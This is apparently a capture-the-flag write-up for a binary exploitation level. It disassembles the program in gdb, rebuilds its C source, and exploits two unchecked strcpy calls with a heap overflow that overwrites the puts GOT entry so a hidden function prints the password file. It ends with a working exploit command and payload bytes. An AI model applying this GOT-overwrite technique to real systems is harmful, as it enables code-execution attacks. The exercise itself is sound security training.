Dump of assembler code for function m:
   0x080484f4 <+0>:	push   ebp
   0x080484f5 <+1>:	mov    ebp,esp
   0x080484f7 <+3>:	sub    esp,0x18
   0x080484fa <+6>:	mov    DWORD PTR [esp],0x0
   0x08048501 <+13>:	call   0x80483d0 <time@plt>
   0x08048506 <+18>:	mov    edx,0x80486e0
   0x0804850b <+23>:	mov    DWORD PTR [esp+0x8],eax
   0x0804850f <+27>:	mov    DWORD PTR [esp+0x4],0x8049960
   0x08048517 <+35>:	mov    DWORD PTR [esp],edx
   0x0804851a <+38>:	call   0x80483b0 <printf@plt>
   0x0804851f <+43>:	leave  
   0x08048520 <+44>:	ret    
End of assembler dump.


We see a call to time_t time(time_t *tloc);

   0x080484fa <+6>:	mov    DWORD PTR [esp],0x0
   0x08048501 <+13>:	call   0x80483d0 <time@plt>

which correponds to :

cur_time = time (NULL);

(gdb) x/s 0x80486e0
0x80486e0:	 "%s - %d\n"

Shows us that printf is probably safe from string vulnerabilities this time.


   0x08048506 <+18>:	mov    edx,0x80486e0

(gdb) x/x 0x8049960
0x8049960 <c>:	0x00000000

This is a memory address , whose value is 0, we can see it as a global variable, that we will call "c"

Then printf is called,

   0x0804850b <+23>:	mov    DWORD PTR [esp+0x8],eax
   0x0804850f <+27>:	mov    DWORD PTR [esp+0x4],0x8049960
   0x08048517 <+35>:	mov    DWORD PTR [esp],edx
   0x0804851a <+38>:	call   0x80483b0 <printf@plt>

printf ("%s - %d\n", c, cur_time);




Dump of assembler code for function main:
   0x08048521 <+0>:	push   ebp
   0x08048522 <+1>:	mov    ebp,esp
   0x08048524 <+3>:	and    esp,0xfffffff0
   0x08048527 <+6>:	sub    esp,0x20
   0x0804852a <+9>:	mov    DWORD PTR [esp],0x8
   0x08048531 <+16>:	call   0x80483f0 <malloc@plt>
   0x08048536 <+21>:	mov    DWORD PTR [esp+0x1c],eax
   0x0804853a <+25>:	mov    eax,DWORD PTR [esp+0x1c]
   0x0804853e <+29>:	mov    DWORD PTR [eax],0x1
   0x08048544 <+35>:	mov    DWORD PTR [esp],0x8
   0x0804854b <+42>:	call   0x80483f0 <malloc@plt>
   0x08048550 <+47>:	mov    edx,eax
   0x08048552 <+49>:	mov    eax,DWORD PTR [esp+0x1c]
   0x08048556 <+53>:	mov    DWORD PTR [eax+0x4],edx
   0x08048559 <+56>:	mov    DWORD PTR [esp],0x8
   0x08048560 <+63>:	call   0x80483f0 <malloc@plt>
   0x08048565 <+68>:	mov    DWORD PTR [esp+0x18],eax
   0x08048569 <+72>:	mov    eax,DWORD PTR [esp+0x18]
   0x0804856d <+76>:	mov    DWORD PTR [eax],0x2
   0x08048573 <+82>:	mov    DWORD PTR [esp],0x8
   0x0804857a <+89>:	call   0x80483f0 <malloc@plt>
   0x0804857f <+94>:	mov    edx,eax
   0x08048581 <+96>:	mov    eax,DWORD PTR [esp+0x18]
   0x08048585 <+100>:	mov    DWORD PTR [eax+0x4],edx
   0x08048588 <+103>:	mov    eax,DWORD PTR [ebp+0xc]
   0x0804858b <+106>:	add    eax,0x4
   0x0804858e <+109>:	mov    eax,DWORD PTR [eax]
   0x08048590 <+111>:	mov    edx,eax
   0x08048592 <+113>:	mov    eax,DWORD PTR [esp+0x1c]
   0x08048596 <+117>:	mov    eax,DWORD PTR [eax+0x4]
   0x08048599 <+120>:	mov    DWORD PTR [esp+0x4],edx
   0x0804859d <+124>:	mov    DWORD PTR [esp],eax
   0x080485a0 <+127>:	call   0x80483e0 <strcpy@plt>
   0x080485a5 <+132>:	mov    eax,DWORD PTR [ebp+0xc]
   0x080485a8 <+135>:	add    eax,0x8
   0x080485ab <+138>:	mov    eax,DWORD PTR [eax]
   0x080485ad <+140>:	mov    edx,eax
   0x080485af <+142>:	mov    eax,DWORD PTR [esp+0x18]
   0x080485b3 <+146>:	mov    eax,DWORD PTR [eax+0x4]
   0x080485b6 <+149>:	mov    DWORD PTR [esp+0x4],edx
   0x080485ba <+153>:	mov    DWORD PTR [esp],eax
   0x080485bd <+156>:	call   0x80483e0 <strcpy@plt>
   0x080485c2 <+161>:	mov    edx,0x80486e9
   0x080485c7 <+166>:	mov    eax,0x80486eb
   0x080485cc <+171>:	mov    DWORD PTR [esp+0x4],edx
   0x080485d0 <+175>:	mov    DWORD PTR [esp],eax
   0x080485d3 <+178>:	call   0x8048430 <fopen@plt>
   0x080485d8 <+183>:	mov    DWORD PTR [esp+0x8],eax
   0x080485dc <+187>:	mov    DWORD PTR [esp+0x4],0x44
   0x080485e4 <+195>:	mov    DWORD PTR [esp],0x8049960
   0x080485eb <+202>:	call   0x80483c0 <fgets@plt>
   0x080485f0 <+207>:	mov    DWORD PTR [esp],0x8048703
   0x080485f7 <+214>:	call   0x8048400 <puts@plt>
   0x080485fc <+219>:	mov    eax,0x0
   0x08048601 <+224>:	leave  
   0x08048602 <+225>:	ret    
End of assembler dump.



**First pair of allocations**

   0x0804852a <+9>:  mov    DWORD PTR [esp],0x8
   0x08048531 <+16>: call   0x80483f0 <malloc@plt>

We first prepare the argument for malloc:

malloc(8);

malloc returns the address of the newly allocated memory in EAX.

   0x08048536 <+21>: mov    DWORD PTR [esp+0x1c],eax

We save the address returned by malloc in the local stack variable [esp+0x1c].

Conceptually:

element1 = malloc(8);

   0x0804853a <+25>: mov eax,DWORD PTR [esp+0x1c]

We load the address of the first allocated block back into EAX. (unnecessary here)

   0x0804853e <+29>: mov    DWORD PTR [eax],0x1

[eax] means the memory located at the address contained in EAX.

Therefore, this instruction writes 1 at the beginning of the first allocated block:

*(int *)element1 = 1;

Conceptually, we can represent the first 8-byte allocation as:

element1
+----------+----------+
|    1     |    ?     |
+----------+----------+
   4 bytes    4 bytes


   0x08048544 <+35>: mov    DWORD PTR [esp],0x8
   0x0804854b <+42>: call   0x80483f0 <malloc@plt>

We perform a second allocation of 8 bytes:

element2 = malloc(8);

Again, malloc returns the address of the allocated block in EAX.


   0x08048550 <+47>: mov    edx,eax

We copy the address returned by the second malloc from EAX to EDX.

EDX = address of element2

   0x08048552 <+49>: mov    eax,DWORD PTR [esp+0x1c]

We load the address of the first allocated block back into EAX:

EAX = address of element1

   0x08048556 <+53>: mov    DWORD PTR [eax+0x4],edx

eax + 4 refers to the second 4-byte field of the first 8-byte allocation.

We therefore store the address of element2 there:

*(char **)(element1 + 4) = element2;

Conceptually, the memory now looks like:

element1
+----------+----------------+
|    1     | address element2|
+----------+----------------+
   4 bytes       4 bytes

This can be represented conceptually as a structure:

struct element_t
{
    int value;
    char *ptr;
};

So the first allocation behaves approximately like:

struct element_t *element1 = malloc(8);

element1->value = 1;
element1->ptr = malloc(8);


**Second pair of allocations**

This is essentially the same pattern as the first pair of allocations.

   0x08048559 <+56>:  mov    DWORD PTR [esp],0x8
   0x08048560 <+63>:  call   0x80483f0 <malloc@plt>

We perform a third allocation of 8 bytes.

malloc returns the address of the allocated block in EAX.

   0x08048565 <+68>:  mov    DWORD PTR [esp+0x18],eax

We save the address returned by the third malloc in the local stack variable [esp+0x18].

Conceptually:

element3 = malloc(8);

   0x08048569 <+72>:  mov    eax,DWORD PTR [esp+0x18]

We load the address of the third allocated block back into EAX.

At this point:

EAX = address of element3

   0x0804856d <+76>:  mov    DWORD PTR [eax],0x2

We write the value 2 at the beginning of the third allocated block.

Conceptually:

element3->value = 2;

The memory can therefore be represented as:

element3
+----------+----------+
|    2     |    ?     |
+----------+----------+
   4 bytes    4 bytes

   0x08048573 <+82>:  mov    DWORD PTR [esp],0x8
   0x0804857a <+89>:  call   0x80483f0 <malloc@plt>

We perform a fourth allocation of 8 bytes:

element4 = malloc(8);

Again, the address returned by malloc is placed in EAX.

   0x0804857f <+94>:  mov    edx,eax

We copy the address returned by the fourth malloc from EAX to EDX.

EDX = address of element4

   0x08048581 <+96>:  mov    eax,DWORD PTR [esp+0x18]

We load the address of the third allocated block back into EAX.

EAX = address of element3

   0x08048585 <+100>: mov    DWORD PTR [eax+0x4],edx

We store the address of element4 at offset +4 inside element3.

Conceptually:

element3->ptr = element4;

The memory now looks like:

element3
+----------+----------------+
|    2     | address element4|
+----------+----------------+
   4 bytes       4 bytes


After these two Allocations the C code should look like this :

struct element_t
{
    int value;
    char *ptr;
};

struct element_t *element1 = malloc(8);
element1->value = 1;
element1->ptr = malloc(8);

struct element_t *element3 = malloc(8);
element3->value = 2;
element3->ptr = malloc(8);


   0x08048588 <+103>:	mov    eax,DWORD PTR [ebp+0xc]
   0x0804858b <+106>:	add    eax,0x4
   0x0804858e <+109>:	mov    eax,DWORD PTR [eax]

set EAX to argv[1]

   0x08048590 <+111>:	mov    edx,eax

save EAX (argv[1]) into EDX

   0x08048592 <+113>:	mov    eax,DWORD PTR [esp+0x1c]

Set EAX to the return value of the first malloc

   0x08048596 <+117>:	mov    eax,DWORD PTR [eax+0x4]

dereference the address EAX + 4, so EAX becomes the value stored 4 bytes after the address contained in EAX.
this corresponds to element1->ptr


   0x08048599 <+120>:	mov    DWORD PTR [esp+0x4],edx
   0x0804859d <+124>:	mov    DWORD PTR [esp],eax
   0x080485a0 <+127>:	call   0x80483e0 <strcpy@plt>

Call strcpy (elem1->ptr, argv[1]);

   0x080485a5 <+132>:	mov    eax,DWORD PTR [ebp+0xc]
   0x080485a8 <+135>:	add    eax,0x8
   0x080485ab <+138>:	mov    eax,DWORD PTR [eax]

set EAX to argv[2]

   0x080485ad <+140>:	mov    edx,eax

save EAX (argv[2]) in EDX

   0x080485af <+142>:	mov    eax,DWORD PTR [esp+0x18]

save the  content of the 3rd malloc into EAX

   0x080485b3 <+146>:	mov    eax,DWORD PTR [eax+0x4]

dereference the address EAX + 4, so EAX becomes the value stored 4 bytes after the address contained in EAX.
this corresponds to element2->ptr

   0x080485b6 <+149>:	mov    DWORD PTR [esp+0x4],edx
   0x080485ba <+153>:	mov    DWORD PTR [esp],eax
   0x080485bd <+156>:	call   0x80483e0 <strcpy@plt>

Call strcpy (elem2->ptr, argv[2]);

   0x080485c2 <+161>:	mov    edx,0x80486e9
   0x080485c7 <+166>:	mov    eax,0x80486eb
   0x080485cc <+171>:	mov    DWORD PTR [esp+0x4],edx
   0x080485d0 <+175>:	mov    DWORD PTR [esp],eax
   0x080485d3 <+178>:	call   0x8048430 <fopen@plt>

call to FILE *fopen(const char *pathname, const char *mode);

(gdb) x/s 0x80486e9
0x80486e9:	 "r"
mode = "r"

(gdb) x/s 0x80486eb
0x80486eb:	 "/home/user/level8/.pass"

pathname = "/home/user/level8/.pass"


   0x080485d8 <+183>:	mov    DWORD PTR [esp+0x8],eax
   0x080485dc <+187>:	mov    DWORD PTR [esp+0x4],0x44 (== 68)
   0x080485e4 <+195>:	mov    DWORD PTR [esp],0x8049960
   0x080485eb <+202>:	call   0x80483c0 <fgets@plt>

call to char *fgets(char *s, int size, FILE *stream);

(gdb) x/s 0x8049960
0x8049960 <c>:	 ""

so we call fgets (0x8049960, 68, FD) where FD is the return value of the previously opened FD
 

   0x080485f0 <+207>:	mov    DWORD PTR [esp],0x8048703
   0x080485f7 <+214>:	call   0x8048400 <puts@plt>
   0x080485fc <+219>:	mov    eax,0x0
   0x08048601 <+224>:	leave  
   0x08048602 <+225>:	ret    


(gdb) x/s 0x8048703
0x8048703:	 "~~"

then we call puts ("~~") and return 0;

char c[68];

struct element_t
{
    int value;
    char *ptr;
};

void m(void)
{
    time_t cur_time;

    cur_time = time(NULL);
    printf("%s - %d\n", c, cur_time);
}

int main(int argc, char **argv)
{
    struct element_t *element1;
    struct element_t *element3;

    FILE *fd;

    element1 = malloc(8);
    element1->value = 1;
    element1->ptr = malloc(8);

    element3 = malloc(8);
    element3->value = 2;
    element3->ptr = malloc(8);

    strcpy(element1->ptr, argv[1]);

    strcpy(element3->ptr, argv[2]);

    fd = fopen("/home/user/level8/.pass", "r");

    fgets(c, 68, fd);

    puts("~~");

    return 0;
}

Let's now analyse the vulnerabilities

There are two calls to strcpy which takes argv[1] and argv[2] that we can exploit.

We know that the solution of the level is contained in the fd, then passed to the "c" buffer.

The m() function is not called by main() but it prints the c buffer

We can perform a buffer overflow on the heap, but not on the stack , therefore we can't change the EIP to target m()

We want to change the GOT table to change the adress of puts to the adress of m() : 0x080484f4

However, if we use strcpy to overflow, we will never reach the GOT table, because the adresses will increase and we would want them to decrease.

We have two strcpy and we can use the first one to set the adress of the second to the adress of puts in the GOT table (0x8049928).
Then we can use the second one to do what it is supposed to do : copy the adress of m in the GOT table !

**Finding the adress of puts on the heap**

Dump of assembler code for function puts@plt:
   0x08048400 <+0>:	jmp    *0x8049928
   0x08048406 <+6>:	push   $0x28
   0x0804840b <+11>:	jmp    0x80483a0
End of assembler dump.

(gdb) x/wx 0x8049928
0x8049928 <puts@got.plt>:	0x08048406


**Finding the adress of the buffers to overflow on the heap**


Breakpoint 1, 0x08048550 in main ()
(gdb) info register eax
eax            0x804a018	134520856

elem1->ptr on the heap is : 0x804a018

We need to find the adress of elem3->ptr and not the value here because we want it to point on elem1->ptr eventually

Breakpoint 2, 0x0804857f in main ()
(gdb) c
Continuing.

(gdb) info register eax
eax            0x804a028	134520872

the address is equal to : EAX + 4 as seen previously in the analysis


The adress of elem3->ptr on the heap is 0x804a028 + 4 = 0x0804a02c


The offset we need is : 

(gdb) p/d 0x0804a02c - 0x804a018
$3 = 20


0x8049928 to little endian -> "\x28\x99\x04\x08"
0x080484f4 to little endian -> "\xf4\x84\x04\x08"

Now we just have to use a 20 characters padding, followed by the address of puts for argv[1] and the adress of the m() function for argv[2]


./level7 $(python -c 'print "A" * 20 + "\x28\x99\x04\x08"') $(python -c 'print "\xf4\x84\x04\x08"')












